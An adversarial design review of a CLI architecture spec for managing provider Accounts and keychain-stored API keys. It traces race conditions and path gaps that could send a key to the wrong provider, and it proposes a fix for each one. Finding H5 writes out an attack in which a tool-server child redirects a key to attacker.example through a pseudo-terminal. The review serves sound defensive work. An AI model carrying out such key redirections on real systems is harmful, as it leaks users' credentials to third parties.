# Adversarial review: AD-15 Interim CLI Account edit after the owner's answers to story 2.12's core plan (2026-11-22)

Scope: today's uncommitted change (`git diff`) to `architecture-agentic-manager.md`: AD-13's added sentence on the pseudo-terminal; AD-15's *Terminal*, *References*, *Add*, *Change* (now split into **Address change**, **Provider change** and **first confirmation**), *Migrate*, *Record*, *Remove*, *Key use* and *Later confirmations*; AD-17's keychain-naming sentence and *Old project files*; and the new "Resolved 2026-11-22 (owner answers at approval of story 2.12's core plan …)" line under Open Questions. The epic 2 tickets for stories 12–14 (`tickets/epic-accounts-model-routing/tickets/tickets.toml`) and the story 2.1 plan were read to check that implementers can build what the spine says.

These owner decisions are fixed and are not challenged here: (1) `remove` refuses, or needs `--force`, while an unreachable project might name the Account; (2) `migrate` never asks for a stored key: it carries over an existing confirmation for the same address, and otherwise the Account arrives unconfirmed; (3) a provider change needs a new key (a remove plus an add), the old key is never sent to the new provider, and an address change within one provider needs only the typed id, `yes` and the warning; (4) a same-user pseudo-terminal that passes the *Terminal* check is outside the threat model.

## Verdict

**Revise before stories 12–14 are built.** The amendment carries out each owner answer in the CLI paragraphs. Two gaps break promises the spine makes in its own words:

- `migrate`'s carry-over trusts a project-store record without checking what has happened to the shared keychain entry since (C1).
- *Key use* reads the keychain outside any guard against the keychain replacement that the provider change now performs (C2).

Several high findings follow one pattern. Decision (3) and the "unconfirmed until a new key" state are written as CLI-only text. Other paths that write the same record shapes do not inherit them: story 17's classifier, story 18's Reload, story 5.5's UI card, the `add` path and a crash in the middle of a provider change. Each of those can confirm an Account without a new key. The tickets for stories 13 and 14 still describe the superseded design.

---

## Critical

### C1. The `migrate` carry-over can confirm a keychain entry that now holds another provider's key.

*Rule text (AD-15 *Migrate*):* "when that project's store … holds a latest `account_added` for the id, with no `account_removed` after it, that names the file entry's provider, scheme, host and port, `migrate` carries it over … and the sentence says the key stored under the id will be used for that destination". AD-17: one keychain entry per id, "replaced only by AD-15 *Change*'s provider change or first confirmation". *Remove* "leaves the keychain entry in place".

*Sequence (every unit obeys the letter):*
1. Per-project stage: project A adds `foo` (anthropic). Its store records `account_added` (anthropic, api.anthropic.com:443). The keychain gets K_anthropic.
2. User-level stage: `migrate --project B`. B's legacy file names `foo` (openai), and B's store has no matching record, so `foo` arrives unconfirmed. `change foo` (first confirmation) replaces the entry with K_openai.
3. The owner points B's seats elsewhere and runs `remove foo`. The keychain still holds K_openai.
4. `migrate --project A`. `foo` is not on the user list, and A's store has a matching anthropic record, so the confirmation is carried over: "the key stored under the id will be used for api.anthropic.com".
5. Result: K_openai is sent to Anthropic. The `add` path blocks this, because its stored-key check fires when "the user store holds … one for another provider or host". `migrate` explicitly skips that check ("That stored-key check belongs to `add` alone").

Two other routes reach the same result. A hand-deleted entry in the user file (`migrate` is not refused on a user-file outside change; see M1) leaves a live user-store record for another destination. A lost or recreated user store (AD-17: "every Account to be re-confirmed") loses the history that would show the entry was replaced.

*Proposed fix (append to the carry-over sentence in *Migrate*):* "A carry-over also requires that the user store holds no entry for that id (`account_added`, `account_changed` or `account_removed`) naming another provider, scheme, host or port, and no `account_added` with `confirmation: typed_id_yes_new_key` at all, since that entry's key was typed after every project-stage confirmation. Otherwise the entry is added unconfirmed, and the sentence says why. A user store created on a Mac where the user Accounts file already existed (a lost store, M9) records `carry_over: off` in its first entry, and `migrate` then carries nothing over." Mirror this in AD-17 *Old project files*: "carrying over the project store's matching confirmation record when the user store holds nothing newer for that id".

### C2. Key use can read the *new* key and send it to the *old* provider while a provider change is running.

*Rule text:* *Key use* checks the record and then reads the key, "read-only … takes no lock" (`test`). A run checks "every call … only while the latest confirmation record … still names it". *Provider change*, holding `user.lock`: "(1) commits `account_removed` … (2) replaces the keychain entry … (3) writes … `account_added`". The rule then promises: "the new key never goes to the old one".

*Sequence:* `agentic serve` is running a step on `foo` (anthropic). In another process the owner runs `change foo --provider openai`.
1. The run's call checks the record: live, anthropic. It passes.
2. The CLI commits (1), then (2): the keychain now holds K_openai.
3. The run's call reads the keychain, gets K_openai and sends it to api.anthropic.com.

Nothing requires `serve` to be stopped during `change`. The bounded wait on `user.lock` applies only to a failed *hash*, and the hash has not failed at step 1.

*Proposed fix (add to *Key use* after "names the same provider, scheme, host, port and key state"):* "The key is read only after the check, and the check is repeated after the read: the caller notes the sequence number of the latest user-store entry for that id before reading the key, and after the read it confirms that the latest entry is still that one. If it is not, the key is dropped unsent and the check runs again. Because a provider change commits `account_removed` before it replaces the entry, a key read after the replacement always fails this re-check." Add an engine test to story 14: a call interleaved between steps (1) and (2) never sends to the old destination.

---

## High

### H1. From story 17, the classifier confirms `migrate`'s unconfirmed Accounts by itself.

*Rule text:*
- *Record:* "one that adds an Account unconfirmed writes its History entry and no confirmation record".
- Also *Record*: "From story 17 the writer classifies the patch with `is_widening`, and its Account widenings write these same entry shapes."
- AD-15's widening kinds include "adding an Account … to the user-level list".

`migrate` lives until story 5.5, which comes after story 17. An implementer of story 17 classifies `migrate`'s user-file write as "adding an Account" and writes the "same entry shape", `account_added`. *Key use* reads that entry as the confirmation record. The unconfirmed Account becomes confirmed, and its keychain entry is sent with no new key, which breaks decision (2).

*Proposed fix (in *Record*):* "An Account added without confirmation (`migrate`'s unconfirmed entries, `--as` included) writes audit kind `account_listed_unconfirmed` (id, provider, scheme, host, port; never the key). It is a widening audit entry, never a confirmation record. *Key use* reads only `account_added` and `account_changed`, and from story 17 `is_widening`'s Account-add widening writes `account_listed_unconfirmed` unless the handler carries an owner confirmation."

### H2. Decision (3) and the new-key rule bind only the CLI paragraph, so story 18's Reload, story 5.5's UI and `add` can still confirm without a new key.

*Rule text:*
- *Later confirmations* lists "epic 4 story 18's hold and confirmed Reload … epic 5 story 5's confirmed Account card, and the UI Undo of a remove" as writers of "the shapes above (`account_removed` then `account_added` for a provider change or a first confirmation …)". It prescribes the record shapes, not the new key.
- *Add*: "That stored-key check belongs to `add` alone".

*Attacks:*
- (a) Hand-edit the user file to change `foo` from anthropic to openai. Story 18's two-step Reload writes `account_removed` and then `account_added` (openai, key stored). K_anthropic now goes to OpenAI.
- (b) Remove `foo` (anthropic), which leaves K_anthropic in the keychain. Hand-add `foo` (openai). The Reload confirms it, or story 5.5's card adds it ("add" in the UI is not the CLI's `add`, so its stored-key check is ambiguous). The leftover key goes to OpenAI.
- (c) Story 5.5's card confirms an Account that `migrate` left unconfirmed with no new key. Decision (2) said it stays unable to send "until confirmed normally".

*Proposed fix (one sentence under *Later confirmations*, path-independent):* "On every path (CLI, UI card, story 18's Reload, Undo), a provider change and a first confirmation read a new key and replace the id's entry exactly as *Change* says, or confirm a keyless loopback Account. A confirmation that adds an id whose keychain entry was last confirmed for another provider or host takes the same new-key path. No path writes `account_added` for a provider other than the latest live record's without a key typed in that confirmation." Delete "belongs to `add` alone" and say instead: "`migrate` never reads, asks for or compares a key."

### H3. An Account with no live record can take the address-change path, and a first confirmation with flags skips the story-18 refusal.

*Rule text:*
- **Address change** is defined as "(the provider unchanged)".
- The **first confirmation** is "(`change <id>`, flags optional, confirming the file's values …)".
- The story-18 refusal sentence sits *inside* the **Provider change** paragraph and ends "a first confirmation has no old destination, so this refusal does not apply to it".

*Divergence:*
- (a) Story 14's implementer A routes `change foo --base-url https://x` on an unconfirmed migrated Account to **Address change**, because the provider in the file is unchanged. That path writes `account_changed` (key state unchanged) and asks for no key. *Key use* then accepts it, and whatever the keychain holds under `foo` goes to `x`. That breaks decision (2). Implementer B routes it to the first confirmation.
- (b) Implementer A reads the story-18 refusal as applying only to provider changes, because of where the sentence sits. Address changes, the one case where "to another host" matters most, then go unguarded. Story 14's ticket assumes the refusal applies to every change.
- (c) A first confirmation run with `--base-url https://remote` on a migrated loopback Account that reachable projects name is exempt ("no old destination"). That is a loopback-to-remote retarget with no story-18 record.

*Proposed fix:* "An Account with no live confirmation record always takes the first-confirmation path, whatever flags are given. **Address change** needs a live record whose provider equals both the file's provider and the new one. The story-18 refusal applies to every `change` and is moved to the general *Change* paragraph. For a first confirmation, the old destination is the file's values, so a first confirmation that also changes them is refused under the same terms. Only a first confirmation of the file's values unchanged is exempt."

### H4. A crash between steps (2) and (3) of a provider change lets `remove` and then `add` send the new key to the old provider.

*Rule text:* After (1) and (2), the keychain holds K_new. The user store's latest `account_added` still names the old provider (with `account_removed` after it). *Add* skips the stored-key check unless the stored confirmation is "for another provider or host", and its sentence names "the provider and host the entry was last confirmed for".

*Sequence:* `change foo --provider openai` (from anthropic) crashes after (2). The owner reads `list`, which says unconfirmed, and runs `remove foo` and then `add foo --provider anthropic` instead of re-running `change`. The latest confirmation names anthropic, so there is no stored-key check. The entry is reused, K_openai goes to Anthropic, and the add's sentence wrongly says the entry was last confirmed for Anthropic.

*Proposed fix:* "Step (1)'s `account_removed` (`reason: provider_change`) records the provider, scheme, host and port the entry is about to hold (`key_for`). `add`'s stored-key check and `migrate`'s carry-over (C1) take the entry's last destination as the `key_for` of a later `account_removed`, when one exists, rather than the latest `account_added`."

### H5. The scope of the stdio MCP and `render: true` refusal is ambiguous, and accepted pseudo-terminals make the narrow reading a way to steal a key.

*Rule text (*Open*):* "they are refused while any project found by the reference scan below enables a stdio MCP server or a Source with `render: true`". AD-13 now accepts that an owner-uid child can drive `agentic accounts` through a pseudo-terminal, and says the CLI-class narrowing "still applies".

*Divergence:* Implementer A refuses while *any reachable project* that the scan visited enables such a child. Implementer B refuses only while a project that *names the Account* does. Under B, a stdio MCP server in project Z, which does not name `foo`, drives `agentic accounts change foo --base-url https://attacker.example` through a pseudo-terminal. It types `foo` and `yes`, and `foo`'s key goes to the attacker's host (address change: "the key stored under its id will now be sent to the new endpoint"). The pseudo-terminal itself is accepted by the owner. The narrowing is the control AD-13 says remains, and reading B removes it.

*Proposed fix:* "refused while any reachable project of the root index enables a stdio MCP server or a Source with `render: true`, whether or not it names the Account". Apply the same to `migrate` (M2).

### H6. The tickets for stories 13 and 14 contradict the amended spine, and AGENTS.md says the ticket is the spec.

- Story 13's description says it adds each entry "through story 12's confirmed add (… History and `account_added`)" and that `--as` adds the Account with "its key typed at story 1's hidden prompt". Its verify step reads "adds each entry through the confirmed add with History and `account_added`". The spine now says: no key is ever asked for, a confirmation is carried over (`confirmation: migrated`) or the Account is unconfirmed with no record, and `--as` entries are unconfirmed.
- Story 14's description says it "never reads or overwrites the Keychain entry" and writes only `account_changed`. The spine now has a provider change that replaces the entry and writes `account_removed` and then `account_added` (`typed_id_yes_new_key`), plus a first-confirmation path.

*Proposed fix:* Send a Sofia REPLAN for tickets 13 and 14, citing the amended AD-15 paragraphs, before either story is planned. Story 12's ticket also needs "`account_removed` carries `reason`" and the C2 re-check.

---

## Medium

### M1. `migrate` is not refused when the user file has an outside change, and its write makes the hand edit look app-written.
*Open* refuses `add`, `change` and `remove` while the user file has an outside change. For `migrate`, it checks only the project's own file. Because `migrate` writes the user file through the writer, it adopts a hand edit's bytes into a new History after-hash. *Key use* stays safe only through the record comparison, while `list` stops showing the drift and C1's hand-deleted-entry route opens. **Fix:** "`migrate` is also refused while the user Accounts file has an outside change, as `add` is."

### M2. `migrate` brings Accounts into force for other projects with no References scan.
A carried-over or unconfirmed id becomes visible to every project that names it. `add` scans those projects, lists their references and refuses on their stdio MCP and `render` children. `migrate` is not in *References*, and *Record* asks for "the references found" in its `account_added` without saying which ones. **Fix:** "`migrate` runs *References* for each entry it adds, lists them in that entry's sentence and record, and is refused as `add` is (H5's scope)."

### M3. "Or one written by hand, is confirmed in the CLI" cannot happen before story 18.
A hand-written Account is an outside change of the user file, and *Open* refuses `change` "until the owner reverts it". **Fix:** delete "or one written by hand", or add: "(a hand-written Account is confirmed only after story 18's Reload)".

### M4. The keyless branch of a provider change contradicts its own sentence.
The sentence promises "the old key deleted from the keychain and not kept". The keyless loopback option "touches no keychain entry", so K_old stays. **Fix:** "a provider change confirmed keyless says that the entry under the id is left in place and will not be read while the key state is `none`" (or delete the entry, if the owner wants that). Also define `replaces` for a first confirmation that follows a crashed provider change: the values named by the last `account_removed`.

### M5. "No Undo" for a provider change conflicts with History-wide Undo.
AD-16: "Undo applies the inverse diff". *Remove*: "Undo of a user-file change goes through the same confirming handler as the change". Story 5.5 may offer Undo on the provider change's History entry as an inverse that only confirms an address, sending K_new back to the old provider. **Fix:** "a provider change's and a first confirmation's History entries are marked `undo: none`, and the UI offers Change provider… instead."

### M6. `--as` contradicts "keeps the same ids".
AD-15's widening list and AD-16 both say the `migrate` `ConfigMigration` "keeps the same Account ids … not widening". `--as` renames ids in project files. From story 18, the grant set is keyed by Account id, so a renamed reference is "naming an Account its approved grant set does not list", which is widening. **Fix:** "keeps each reference's Account destination; a `--as` rename also renames the id in that project's approved grant set in the same `ConfigMigration` (from story 18), so it is not widening."

### M7. A leftover keychain entry blocks `add` for good.
After `remove foo` (anthropic), `add foo --provider openai` requires the owner to type the stored *Anthropic* key, and it must match. An owner who wants to use their OpenAI key has no path except deleting the entry in Keychain Access. Decision (3) supplies the fitting behaviour. **Fix:** "when the entry was last confirmed for another provider or host, `add` takes *Change*'s new-key path (new key typed, entry replaced, `typed_id_yes_new_key`) instead of the equality check."

### M8. The result of a carry-over depends on the order projects are migrated.
Migrate B (no record) and then A (matching record): `foo` is "already present", so A "needs nothing", and `foo` stays unconfirmed. Migrating A and then B confirms it. The same happens after a crash where the user-file intent was reconciled without its carried record. **Fix:** "an already-present entry with no live confirmation record, whose project record matches, is offered the carry-over (subject to C1)."

### M9. A lost user store makes every Account command refuse with no way out.
If `accounts.yaml` exists with no `user.db` (or no History for it), implementer A treats it as an outside change, refuses everything, and offers no "revert" target before story 18. Implementer B adopts it silently. **Fix:** "a user file with no History in the user store is an outside change; the CLI names moving it to `backups/` and re-adding each Account (keychain entries are reused under *Add*'s stored-key check)". This is tied to C1's `carry_over: off`.

---

## Low

- **L1.** "It is the CLI's only way to confirm or re-confirm an Account" (end of *Provider change*) conflicts with `add` (`typed_id`) and `migrate`'s carry-over. **Fix:** "the CLI's only way to re-confirm an existing Account". The "It" is also ambiguous after the keyless and reconciled-write sentences, so name `change`.
- **L2.** "A source entry that names no provider does not match": "source entry" is easy to read as the legacy *file* entry. Story 2.1's `account_added` recorded no provider (its plan), so every Account added in story 2.1 arrives unconfirmed. **Fix:** say "a project audit entry that records no provider (story 2.1's)", and have `--dry-run` show "unconfirmed: no provider in the project's record".
- **L3.** `--as` says "no keychain entry exists under it". That is not checked and may be false, for example after a remove of an earlier Account with the new id. **Fix:** "whatever entry exists under the new id is not used until a first confirmation replaces it".
- **L4.** "After storing the new key when one is needed": the CLI cannot tell without reading the entry. **Fix:** "after storing the key typed in this confirmation (always, for a keyed Account)".
- **L5.** Root-index entries for deleted projects never become reachable, so `remove --force` becomes routine and loses its meaning. **Fix:** note an owner "forget project" path (Doctor), or let the `--force` sentence name each project's last-seen path and date.
- **L6.** Name the `SecretStore` replace method, callable only from the provider-change and first-confirmation handlers, so story 12's "never overwritten" guard test permits exactly that one caller.
- **L7.** The Open Questions line credits "confirmed later by `change <id>` with a new key" to the owner. The owner said "confirmed normally". Requiring a *new key* even when the existing entry for that id is the right key is an architect reading. **Fix:** mark it "(architect's reading of 'confirmed normally', for the owner)".
- **L8.** AD-17 *Old project files* says "until the owner renames one", while AD-15 offers `--as`. **Fix:** "until the owner renames one, or passes `--as` (AD-15 *Migrate*)".

## No contradiction found

- AD-17's "replaced only by … provider change or first confirmation … otherwise never overwritten" agrees with *Add*'s "reused, never overwritten" and with *Change* step (2).
- AD-13's pseudo-terminal sentence agrees with *Terminal*.
- The `--force` scope (unreachable projects only, never a found reference) matches decision (1).
- The shape order in *Record* (`account_removed` and then `account_added`) agrees with *Key use*'s "latest confirmation record … with no `account_removed` after it": the new `account_added` comes after the removal, and a crash after (1) leaves the Account refused, as intended. C2 and H4 are the gaps around that order, not contradictions in it.
